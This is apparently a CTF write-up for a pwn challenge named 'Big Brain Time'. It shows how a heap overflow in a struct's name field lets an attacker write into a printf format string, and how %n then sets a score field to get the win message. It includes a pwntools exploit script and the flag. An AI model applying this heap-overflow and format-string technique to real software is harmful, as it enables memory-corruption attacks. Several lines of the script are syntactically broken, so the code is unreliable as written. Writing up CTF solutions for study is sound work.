---
title: Big Brain Time
date: 2020-12-22
categories: [pwn]
tags: [interiutctf]
toc: false
---

#### Notes:

- We know address of qi_de_base

- 0x8202010

- There is format string vuln

- printf(user->display, user->name, user->sex);

- user data is written in heap

- no aslr and no pie

- Have heap overflow on user->name

  
```C
typedef struct moron
{
	int qi;
	char sex;
	char name[STR_LEN];
	display[STR_LEN];
}	person
```
This is the user->qi `person *user = new_p();`

#### Steps:

  
1. Use heap overflow on user->name to write into user->display

- user->display is where the fmt string bug is located

2. Find address of *user with format string

- target is person *user = new_p(), goal is to override user->qi which is the first index of the struct.

3. Send payload to write to address of user->qi (from step 3)

after filling user->name buffer Final payload: Junk (to fill user->name) + payload to write to user->display + format string to write to user->qi with length of payload written to user->display

  

#### Heap Overflow

```C
typedef struct moron
{
	int qi;
	char sex;
	char name[64];
	display[64];
}	person

Person *user = new Moron;

// Heap overflow to override display

scanf("%s", user->name)
```
  

#### Format String
```C
user_display = 'A' * val_length_for_qi + "offset_to_qi%n";

printf(user_display);
```

#### Goal
```C
// To make user->qi > 128
if (user->qi > 128) {
	puts("WIN");
} else {
	puts("Vous êtes sûrs d'être en bonne santé ?");
}
```
  

#### Code

  
```Python
from pwn import 

io = process('./bigbrain')
context.log_level = 'debug'

context.terminal = ['tmux', 'splitw', '-v']

def nom(payload, io):
	io.sendlineafter('Nom :', payload)

def sexe(payload, io):
	io.sendlineafter('Sexe [M/F] :', payload)

junk = b'A'*0x40
val_length_for_qi = b'B'*129
fmt_string_offset = b'%9$n,'

nom_payload = (
	junk
	val_length_for_qi
	fmt_string_offset
)

sexe_payload = 'M'

nom(nom_payload, io)
sexe(sexe_payload, io)

io.interactive()
//H2G2{w0w_5uch_vu1n3r4b1lit13s}
```